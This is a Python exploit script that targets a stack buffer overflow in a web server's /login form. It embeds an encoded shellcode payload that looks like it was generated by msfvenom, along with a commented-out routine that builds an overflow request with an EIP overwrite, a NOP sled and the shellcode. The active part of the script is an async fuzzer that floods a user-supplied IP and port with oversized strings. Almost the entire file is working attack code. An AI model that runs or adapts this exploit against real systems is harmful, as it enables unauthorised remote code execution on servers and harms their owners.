
import asyncio
import argparse


buf =  b""
buf += b"\xdd\xc5\xd9\x74\x24\xf4\xba\xa7\xdd\xc0\xc5\x5e"
buf += b"\x33\xc9\xb1\x52\x31\x56\x17\x83\xee\xfc\x03\xf1"
buf += b"\xce\x22\x30\x01\x18\x20\xbb\xf9\xd9\x45\x35\x1c"
buf += b"\xe8\x45\x21\x55\x5b\x76\x21\x3b\x50\xfd\x67\xaf"
buf += b"\xe3\x73\xa0\xc0\x44\x39\x96\xef\x55\x12\xea\x6e"
buf += b"\xd6\x69\x3f\x50\xe7\xa1\x32\x91\x20\xdf\xbf\xc3"
buf += b"\xf9\xab\x12\xf3\x8e\xe6\xae\x78\xdc\xe7\xb6\x9d"
buf += b"\x95\x06\x96\x30\xad\x50\x38\xb3\x62\xe9\x71\xab"
buf += b"\x67\xd4\xc8\x40\x53\xa2\xca\x80\xad\x4b\x60\xed"
buf += b"\x01\xbe\x78\x2a\xa5\x21\x0f\x42\xd5\xdc\x08\x91"
buf += b"\xa7\x3a\x9c\x01\x0f\xc8\x06\xed\xb1\x1d\xd0\x66"
buf += b"\xbd\xea\x96\x20\xa2\xed\x7b\x5b\xde\x66\x7a\x8b"
buf += b"\x56\x3c\x59\x0f\x32\xe6\xc0\x16\x9e\x49\xfc\x48"
buf += b"\x41\x35\x58\x03\x6c\x22\xd1\x4e\xf9\x87\xd8\x70"
buf += b"\xf9\x8f\x6b\x03\xcb\x10\xc0\x8b\x67\xd8\xce\x4c"
buf += b"\x87\xf3\xb7\xc2\x76\xfc\xc7\xcb\xbc\xa8\x97\x63"
buf += b"\x14\xd1\x73\x73\x99\x04\xd3\x23\x35\xf7\x94\x93"
buf += b"\xf5\xa7\x7c\xf9\xf9\x98\x9d\x02\xd0\xb0\x34\xf9"
buf += b"\xb3\x7e\x60\x76\x87\x17\x73\x78\x16\xb4\xfa\x9e"
buf += b"\x72\x54\xab\x09\xeb\xcd\xf6\xc1\x8a\x12\x2d\xac"
buf += b"\x8d\x99\xc2\x51\x43\x6a\xae\x41\x34\x9a\xe5\x3b"
buf += b"\x93\xa5\xd3\x53\x7f\x37\xb8\xa3\xf6\x24\x17\xf4"
buf += b"\x5f\x9a\x6e\x90\x4d\x85\xd8\x86\x8f\x53\x22\x02"
buf += b"\x54\xa0\xad\x8b\x19\x9c\x89\x9b\xe7\x1d\x96\xcf"
buf += b"\xb7\x4b\x40\xb9\x71\x22\x22\x13\x28\x99\xec\xf3"
buf += b"\xad\xd1\x2e\x85\xb1\x3f\xd9\x69\x03\x96\x9c\x96"
buf += b"\xac\x7e\x29\xef\xd0\x1e\xd6\x3a\x51\x2e\x9d\x66"
buf += b"\xf0\xa7\x78\xf3\x40\xaa\x7a\x2e\x86\xd3\xf8\xda"
buf += b"\x77\x20\xe0\xaf\x72\x6c\xa6\x5c\x0f\xfd\x43\x62"
buf += b"\xbc\xfe\x41"


def http_header(address, path):
    header = b"POST /login HTTP/1.1\r\n"
    header += b"Host: " + address + b"\r\n"
    header += b"User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:102.0) Gecko/20100101 Firefox/102.0\r\n"
    header += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
    header += b"Accept-Language: en-US,en;q=0.5\r\n"
    header += b"Accept-Encoding: gzip, deflate\r\n"
    header += b"Content-Type: application/x-www-form-urlencoded\r\n"
    header += b"Referer: http://" + address + path  + b"\r\n"
    header += b"Connection: close\r\n"
    header += b"Origin: http://" + address + b"\r\n"
    return header

def Packet_Generator(address, path):
    """header = http_header(address,path)
    
    input_buf = b"A"*780
    eip = b"\x83\x0c\x09\x10"
    offset =b"cccc"
    nop = b"\x90"*10
    content = b"username=" + input_buf + eip + offset + nop +  buf  + b"&password=a" ##
    

    header += ("Content-Length: "+str(len(content))+"\r\n\r\n").encode()"""

    fuz = b""

    while(1):
        fuz += b"a"*1308 +b"bbbb"
        yield fuz
        ##yield header + content


async def main():
    n = 1
    parser = argparse.ArgumentParser()
    parser.add_argument('--ip_address','-ip', type=str, help='target\'s address')
    parser.add_argument('--path', '-pa' )
    parser.add_argument('--port', '-p', type=int)

    args = parser.parse_args()
    
    ##metho = parser.method

    ip = args.ip_address
    port = args.port

    packet = Packet_Generator(ip.encode(),args.path.encode())

    count = 0
    try:
        reader, writer = await asyncio.open_connection(
                host=ip, port=port)
        while(1):
            d = next(packet)
            print(d)
            try:
                writer.write(d)
                reply = await reader.read()
                print(reply.decode())
                count += 1
            except asyncio.exceptions:
                print("coumt {}".format(count))


        
    except OSError:
        print('connection fail')

asyncio.run(main())
